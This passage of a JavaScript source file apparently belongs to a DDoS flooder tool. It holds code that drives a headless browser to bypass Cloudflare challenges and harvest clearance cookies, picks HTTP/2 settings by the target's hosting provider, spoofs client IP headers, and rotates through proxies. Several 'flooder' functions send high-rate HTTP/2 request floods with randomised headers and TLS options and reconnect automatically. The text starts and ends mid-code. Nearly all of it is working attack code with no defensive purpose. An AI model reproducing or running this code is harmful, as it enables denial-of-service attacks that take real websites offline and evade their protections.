        await new Promise(r => setTimeout(r, 1000));
        
        const cookies = await page.cookies();
        
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        
        const userAgent = await page.evaluate(() => navigator.userAgent);
        
        await page.close();
        await browser.close();
        
        return {
            cookies: cookies,
            userAgent: userAgent,
            cfClearance: cfClearance ? cfClearance.value : null,
            success: true,
            attemptNum: attemptNum
        };
        
    } catch (error) {
        try {
            if (page) await page.close();
            if (browser) await browser.close();
        } catch (cleanupError) {}
        
        return {
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: false,
            attemptNum: attemptNum
        };
    }
}

async function bypassCloudflareParallel(totalCount) {
    const results = [];
    let attemptCount = 0;
    
    const concurrentBypassSessions = 10;
    const remaining = totalCount - results.length;
    const currentBatchSize = Math.min(concurrentBypassSessions, remaining);
        
    const batchPromises = [];
    for (let i = 0; i < currentBatchSize; i++) {
        attemptCount++;
        batchPromises.push(bypassCloudflareOnce(attemptCount));
    }
        
    const batchResults = await Promise.all(batchPromises);
        
    for (const result of batchResults) {
        if (result.success && result.cookies.length > 0) {
            results.push(result);
        }
    }
        
    if (results.length < totalCount) {
        await new Promise(r => setTimeout(r, 2000));
    }
    
    if (results.length === 0) {
        results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: true
        });
    }
    
    return results;
}

function getSettingsBasedOnISP(isp) {
    const defaultSettings = {
        headerTableSize: 65536,
        initialWindowSize: Math.random() < 0.5 ? 6291456: 33554432,
        maxHeaderListSize: 262144,
        enablePush: false,
        maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
        maxFrameSize: 16384,
        enableConnectProtocol: false,
    };
    const settings = { ...defaultSettings };
    if (isp === 'Cloudflare, Inc.') {
        settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
        settings.initialWindowSize = 65536;
        settings.maxFrameSize = 16384;
        settings.enableConnectProtocol = false;
    } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 65536;
        settings.maxFrameSize = 16777215;
        settings.maxConcurrentStreams = 128;
        settings.maxHeaderListSize = 4294967295;
    } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
        settings.headerTableSize = 4096;
        settings.maxConcurrentStreams = 100;
        settings.initialWindowSize = 6291456;
        settings.maxFrameSize = 16384;
        settings.maxHeaderListSize = 32768;
    } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 65535;
        settings.maxFrameSize = 16384;
        settings.maxConcurrentStreams = 100;
        settings.maxHeaderListSize = 4294967295;
    } else if (isp === 'Ddos-guard LTD') {
        settings.maxConcurrentStreams = 8;
        settings.initialWindowSize = 65535;
        settings.maxFrameSize = 16777215;
        settings.maxHeaderListSize = 262144;
    } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
        settings.maxConcurrentStreams = 100;
        settings.initialWindowSize = 65535;
        settings.maxHeaderListSize = 262144;
    } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 8388608;
        settings.maxFrameSize = 16384;
        settings.maxConcurrentStreams = 100;
        settings.maxHeaderListSize = 4294967295;
    } else if (isp === 'Google LLC') {
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 1048576;
        settings.maxFrameSize = 16384;
        settings.maxConcurrentStreams = 100;
        settings.maxHeaderListSize = 137216;
    } else {
        settings.headerTableSize = 65535;
        settings.maxConcurrentStreams = 1000;
        settings.initialWindowSize = 6291456;
        settings.maxHeaderListSize = 261144;
        settings.maxFrameSize = 16384;
    }
    return settings;
}

async function getIPAndISP(urlHost) {
    try {
        const { address } = await util.promisify(dns.lookup)(urlHost);
        const apiUrl = `http://ip-api.com/json/ ${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            return data.isp;
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

// --- MAIN FLOODER FUNCTIONS ---

// Script 1 style flooder
function runFlooderScript1() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgentv2 = new UserAgent();
    var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
    
    const headers = {};
    headers[":method"] = randomMethod;
    headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
    headers[":authority"] = parsedTarget.host;
    headers[":scheme"] = "https";
    headers["user-agent"] = uap1;
    headers["Referer"] = randomElement(referer);
    headers["Via"] = fakeIP;
    headers["X-Forwarded-For"] = fakeIP;
    headers["Client-IP"] = fakeIP;
    headers["Real-IP"] = fakeIP;
    
    const randomHeaders = {
        'Content-Type': randomElement(['application/json', 'text/html']),
        'x-download-options': 'noopen',
        'Cross-Origin-Embedder-Policy': randomElement(hihi),
        'Cross-Origin-Opener-Policy': randomElement(hihi),
        'accept': randomElement(accept_header),
        'accept-language': randomElement(lang_header),
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'x-cache': 'MISS',
        'Content-Security-Policy': "default-src 'self'",
        'accept-encoding': randomElement(encoding_header),
        'cache-control': randomElement(controle_header),
        'x-frame-options': 'SAMEORIGIN',
        'x-xss-protection': '1; mode=block',
        'x-content-type-options': "nosniff",
        'TE': "trailers",
        'pragma': "no-cache",
        'sec-ch-ua-platform': randomElement(['Windows', 'Linux', 'macOS', 'Android']),
        'upgrade-insecure-requests': "1",
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-ch-ua': randomElement([
            `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            `"Not/A)Brand";v="8", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(115 + Math.random() * 10)}"`
        ]),
        'sec-ch-ua-mobile': Math.random() > 0.5 ? "?0" : "?1",
        'vary': 'Accept-Encoding',
        'x-requested-with': "XMLHttpRequest",
        'set-cookie': CookieCf,
        'Server': 'cloudflare',
        'strict-transport-security': 'max-age=15552000',
        'access-control-allow-headers': 'Origin, X-Requested-With, Content-Type, Accept',
        'access-control-allow-origin': '*',
        'Content-Encoding': 'gzip',
        'alt-svc': 'h3=":443"; ma=86400'
    };
    
    Object.assign(headers, randomHeaders);

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 25
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
           ALPNProtocols: ['h2'],
           ciphers: tls.getCiphers().join(":") + cipper,
           secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
           servername: parsedTarget.hostname,
           socket: connection,
           honorCipherOrder: true,
           secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | 0x4,
           sigals: concu,
           echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
           secure: true,
           Compression: false,
           rejectUnauthorized: false,
           port: 443,
           uri: parsedTarget.host,
           servername: parsedTarget.host,
           sessionTimeout: 5000,
       };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: {
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 20000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         });

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   const request = client.request(headers)
                   
                   .on("response", response => {
                       request.close();
                       request.destroy();
                       return
                   });
   
                   request.end();
               }
           }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

// Script 2 style flooder
function runFlooderScript2() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    const browser = getRandomBrowser();
    let headers = generateHeaders(browser);
    
    const randomString = randstr(10);
    clength = urihost[Math.floor(Math.random() * urihost.length)];
    
    const headers4 = {
        ...(Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
        ...(Math.random() < 0.75 ?{"referer": "https:/" +clength} :{}),
        ...(Math.random() < 0.75 ?{"origin": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/'): "https://"+ (Math.random() < 0.5 ?'root-admin.': 'root-root.') +clength}:{}),
    }

    let allHeaders = Object.assign({}, headers, headers4);
    let dyn = {
        ...(Math.random() < 0.5 ?{['cf-sec-with-from-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
        ...(Math.random() < 0.5 ?{['user-x-with-'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),          
    },
    dyn2 = {
        ...(Math.random() < 0.5 ?{"upgrade-insecure-requests": "1"} : {}),
        ...(Math.random() < 0.5 ? { "purpose": "prefetch"} : {} ),
        "RTT" : "1"
    }  

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: `${parsedTarget.host}:443`,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error) return;
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        let isp = await getIPAndISP(parsedTarget.host);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: cipper,
            requestCert: true,
            sigalgs: sigalgs.join(':'),
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureProtocol: Math.random() < 0.5 ? ['TLSv1_3_method', 'TLSv1_2_method'] : ['TLSv1_3_method'],
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };
        
        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setMaxListeners(0);
        
        function generateJA3Fingerprint(socket) {
            const cipherInfo = socket.getCipher();
            const supportedVersions = socket.getProtocol();
        
            if (!cipherInfo) {
                return null;
            }
        
            const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
        
            const md5Hash = crypto.createHash('md5');
            md5Hash.update(ja3String);
        
            return md5Hash.digest('hex');
        }
        
        tlsSocket.on('connect', () => {
            const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
        });

        let hpack = new HPACK();
        const client = http2.connect(parsedTarget.href, {
            protocol: "https",
            createConnection: () => tlsSocket,
            settings : getSettingsBasedOnISP(isp),
            socket: tlsSocket,
        });

        client.setMaxListeners(0);
        
        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
        client.on('remoteSettings', (settings) => {
            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
            client.setLocalWindowSize(localWindowSize, 0);
        });
        
        client.on('connect', () => {
            client.ping((err, duration, payload) => {});
            client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
        });

        const clients = [client];
        clients.forEach(c => {
            const intervalId = setInterval(() => {
                async function sendRequests() {
                    const shuffleObject = (obj) => {
                        const keys = Object.keys(obj);
                        for (let i = keys.length -1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [keys[i], keys[j]] = [keys[j], keys[i]];
                        }
                        const shuffledObj = {};
                        keys.forEach(key => shuffledObj[key] = obj[key]);
                        return shuffledObj;
                    };

                    const dynHeaders = shuffleObject({
                        ...dyn,
                        ...allHeaders,
                        ...dyn2,
                        ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {}),
                    });

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(dynHeaders)
                    ]);

                    const streamId = 1;
                    const requests = [];
                    let count = 0;

                    const increaseRequestRate = async (client, dynHeaders, args) => {
                        if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                            for (let i = 0; i < args.Rate; i++) {
                                const requestPromise = new Promise((resolve, reject) => {
                                    const req = client.request(dynHeaders, {
                                        weight: Math.random() < 0.5 ? 251 : 231,
                                        depends_on: 0,
                                        exclusive: Math.random() < 0.5 ? true : false,
                                    })
                                    .on('response', response => {
                                        req.close(http2.constants.NO_ERROR);
                                        req.destroy();
                                        resolve();
                                    });
                                    req.on('end', () => {
                                        count++;
                                        if (count === args.time * args.Rate) {
                                            clearInterval(intervalId);
                                            client.close(http2.constants.NGHTTP2_CANCEL);
                                        }
                                        reject(new Error('Request timed out'));
                                    });

                                    req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                                });

                                const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                                requests.push({ requestPromise, frame });
                            }

                            await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                        }
                    }

                    await increaseRequestRate(client, dynHeaders, args);
                }

                sendRequests();
            }, 500);
        });
            
        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooderScript2();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return runFlooderScript2();
        });
    });
}

function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  let maxi = getRandomNumber(2,3)
    for (let i =1; i <=maxi ; i++) {
      const key = 'cf-sec-'+ generateRandomString(1,9)
      const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
      doiTuong[key] = value;
    }
    return doiTuong;
}

// Script 3 style flooder (Puppeteer-based bypass integration)
function floodWithCookies(userAgent, cookie) {
    try {
        let parsed = parsedTarget;
        let path = parsed.path;

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        let interval = randomDelay(100, 1000);

        function getChromeVersion(userAgent) {
            const chromeVersionRegex = /Chrome\/([\d.]+)/;
            const match = userAgent.match(chromeVersionRegex);
            if (match && match[1]) {
                return match[1];
            }
            return null;
        }

        const chromever = getChromeVersion(userAgent) || "126";
        const randValue = list => list[Math.floor(Math.random() * list.length)];
        const lang_header1 = [
            "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
            "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9",
            "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9",
            "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9",
            "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9",
            "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9"
        ];

        function shuffleObject(obj) {
            const keys = Object.keys(obj);
            const shuffledKeys = keys.reduce((acc, _, index, array) => {
                const randomIndex = Math.floor(Math.random() * (index + 1));
                acc[index] = acc[randomIndex];
                acc[randomIndex] = keys[index];
                return acc;
            }, []);
            const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
            return shuffledObject;
        }

        let fixed = {
            ":method": "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": userAgent,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "cookie": cookie,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "Chrome";v="${chromever}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept-encoding": "gzip, deflate, br, zstd",
            ...shuffleObject({
                "accept-language": randValue(lang_header1) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
                "purpure-secretf-id": "formula-" + generateRandomString(1, 2)
            }),
            "priority": "u=0, i",
            "te": "trailers"
        };

        let randomHeaders = {
            ...(Math.random() < 0.3 ? { "purpure-secretf-id": "formula-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.5 ? { "sec-stake-fommunity": "bet-clc" } : {}),
            ...(Math.random() < 0.6 ? { [generateRandomString(1, 2) + "-SElF-DYNAMIC-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["stringclick-bad-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["root-user" + generateRandomString(1, 2)]: "root-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["Java-x-seft" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.6 ? { ["HTTP-requests-with-unusual-HTTP-headers-or-URI-path-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.3 ? { [generateRandomString(1, 2) + "-C-Boost-" + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) } : {}),
            ...(Math.random() < 0.3 ? { ["sys-nodejs-" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) } : {})
        };

        let headerPositions = [
            "accept-language",
            "sec-fetch-user",
            "sec-ch-ua-platform",
            "accept",
            "sec-ch-ua",
            "sec-ch-ua-mobile",
            "accept-encoding",
            "purpure-secretf-id",
            "priority"
        ];

        let headersArray = Object.entries(fixed);
        let shuffledRandomHeaders = Object.entries(randomHeaders).sort(() => Math.random() - 0.5);

        shuffledRandomHeaders.forEach(([key, value]) => {
            let insertAfter = headerPositions[Math.floor(Math.random() * headerPositions.length)];
            let index = headersArray.findIndex(([k, v]) => k === insertAfter);
            if (index !== -1) {
                headersArray.splice(index + 1, 0, [key, value]);
            }
        });

        let dynHeaders = Object.fromEntries(headersArray);

        const secureOptionsList = [
            crypto.constants.SSL_OP_NO_RENEGOTIATION,
            crypto.constants.SSL_OP_NO_TICKET,
            crypto.constants.SSL_OP_NO_SSLv2,
            crypto.constants.SSL_OP_NO_SSLv3,
            crypto.constants.SSL_OP_NO_COMPRESSION,
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
            crypto.constants.SSL_OP_TLSEXT_PADDING,
            crypto.constants.SSL_OP_ALL
        ];

        function createCustomTLSSocket(parsed) {
            const tlsSocket = tls.connect({
                host: parsed.host,
                port: 443,
                servername: parsed.host,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                ALPNProtocols: ["h2"],
                rejectUnauthorized: false,
                sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
                ecdhCurve: "X25519:P-256:P-384",
                ...(Math.random() < 0.5
                    ? { secureOptions: secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)] }
                    : {})
            });
            tlsSocket.setKeepAlive(true, 600000 * 1000);
            return tlsSocket;
        }

        const tlsSocket = createCustomTLSSocket(parsed);
        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                "NO_RFC7540_PRIORITIES": Math.random() < 0.5 ? true : "1"
            }
        }, (session) => {
            session.setLocalWindowSize(12517377 + 65535);
        });

        client.on("connect", () => {
            let clearr = setInterval(async () => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request({ ...dynHeaders }, {
                        weight: Math.random() < 0.5 ? 42 : 256,
                        depends_on: 0,
                        exclusive: false
                    });

                    request.on("response", (res) => {
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        if (res[":status"] === 429) {
                            interval = 20000;
                            client.close();
                        }
                    });
                    request.end();
                }
            }, interval);

            let goawayCount = 0;
            client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                let backoff = Math.min(1000 * Math.pow(2, goawayCount), 15000);
                setTimeout(() => {
                    goawayCount++;
                    client.destroy();
                    tlsSocket.destroy();
                    floodWithCookies(userAgent, cookie);
                }, backoff);
            });

            client.on("close", () => {
                clearInterval(clearr);
                client.destroy();
                tlsSocket.destroy();
                return floodWithCookies(userAgent, cookie);
            });

            client.on("error", (error) => {
                client.destroy();
                tlsSocket.destroy();
                return floodWithCookies(userAgent, cookie);
            });
        });

        client.on("error", (error) => {
            client.destroy();
            tlsSocket.destroy();
        });
    } catch (err) {
    }
}

// StevenStore Flooder (Script 4)
function runStevenStoreAttack() {
    function start() {
        const line = proxies[Math.floor(Math.random() * proxies.length)].trim();
        const parts = line.split(':');
        let proxy = null;
        if (parts.length === 4) {
            proxy = {
                host: parts[0],
                port: parts[1],
                auth: `${parts[2]}:${parts[3]}`
            };
        } else if (parts.length === 2) {
            proxy = {
                host: parts[0],
                port: parts[1],
                auth: null
            };
        }

        if (!proxy) return setTimeout(start, 100);

        Socker.createSecureConnection(proxy, (socket) => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => socket,
                settings: {
                    enablePush: false,
                    initialWindowSize: 16777215,
                    maxConcurrentStreams: 65535
                }
            });

            const fire = setInterval(() => {
                if (client.destroyed) {
                    clearInterval(fire);
                    start();
                    return;
                }

                const commonSecFetchSite = ['none', 'same-origin', 'same-site', 'cross-site'];
                const commonSecFetchMode = ['navigate', 'no-cors', 'cors', 'same-origin'];
            
                for (let i = 0; i < args.Rate * 2; i++) {
                    try {
                        // StevenStore UA Logic
                        const stevenUA = [
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.46",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36 OPR/88.0.4412.40",
                            "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/112.0.5615.49 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36",
                            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
                            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; Galaxy Z Flip5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/123.0.0.0 Mobile Safari/537.36",
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4",
                            "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-S721B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-X920N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-X826N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-F956B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-F741N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-F958N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-A047F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-A042M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36",
                            "Mozilla/5.0 (Android 14; Mobile; rv:68.0) Gecko/68.0 Firefox/118.0",
                            "Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:118.0) Gecko/118.0 Firefox/118.0",
                            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1",
                            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15",
                            "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53",
